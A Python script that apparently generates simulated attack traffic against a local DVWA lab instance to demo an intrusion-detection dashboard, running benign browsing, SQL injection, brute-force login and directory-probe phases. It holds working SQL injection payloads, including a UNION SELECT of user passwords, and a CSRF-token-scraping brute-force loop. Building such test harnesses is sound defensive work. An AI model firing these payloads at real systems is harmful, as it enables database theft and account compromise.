"""Sozo Attacker Bot: Automated Pitch Simulator."""
import requests
import re
import time

TARGET = "http://localhost:8080"

def run_simulation():
    print("[BOT] Initializing attack simulation for live demo...")
    s = requests.Session()
    
    # 1. Extract CSRF Token and Login
    print("[BOT] Bypassing DVWA login...")
    try:
        r = s.get(f"{TARGET}/login.php")
        token_match = re.search(r"name='user_token' value='([^']+)'", r.text)
        token = token_match.group(1) if token_match else ""
        s.post(f"{TARGET}/login.php", data={
            "username": "admin", "password": "password", 
            "Login": "Login", "user_token": token
        })
    except Exception as e:
        print(f"[ERROR] Could not connect to DVWA at {TARGET}. Is it running?")
        return

    # 2. Phase 1: Benign Browsing (Proves zero false positives)
    print("\n[BOT] PHASE 1: Benign Browsing (Building baseline)...")
    for _ in range(3):
        s.get(f"{TARGET}/index.php")
        s.get(f"{TARGET}/vulnerabilities/sqli/")
        time.sleep(1)

    # 3. Phase 2: SQL Injection (Triggers Innate Engine)
    print("\n[BOT] PHASE 2: SQL Injection Attack...")
    sqli_payloads = [
        "1' OR '1'='1",
        "1' UNION SELECT user,password FROM users#",
        "1' AND SLEEP(3)#"
    ]
    for p in sqli_payloads:
        s.get(f"{TARGET}/vulnerabilities/sqli/?id={p}&Submit=Submit")
        print(f"  -> Fired SQLi payload")
        time.sleep(1.5)

    # 4. Phase 3: Brute Force (Triggers Threshold Engine)
    print("\n[BOT] PHASE 3: Brute Force Attack...")
    for i in range(6):
        # We need a new token for the brute force page
        bf_page = s.get(f"{TARGET}/vulnerabilities/brute/").text
        bf_token = re.search(r"name='user_token' value='([^']+)'", bf_page)
        bf_tok = bf_token.group(1) if bf_token else ""
        s.post(f"{TARGET}/vulnerabilities/brute/", data={
            "username": "admin", "password": f"wrong_pass_{i}", 
            "Login": "Login", "user_token": bf_tok
        })
        print(f"  -> Brute force attempt {i+1}")
        time.sleep(0.5)

    # 5. Phase 4: Recon Scan (Triggers Scanner Engine)
    print("\n[BOT] PHASE 4: Reconnaissance Scan...")
    for i in range(25):
        s.get(f"{TARGET}/admin_panel_{i}.php")
    print("  -> Fired 25 directory probes (404s)")
    
    print("\n[BOT] Simulation complete! Check the Streamlit Dashboard!")

if __name__ == "__main__":
    run_simulation()
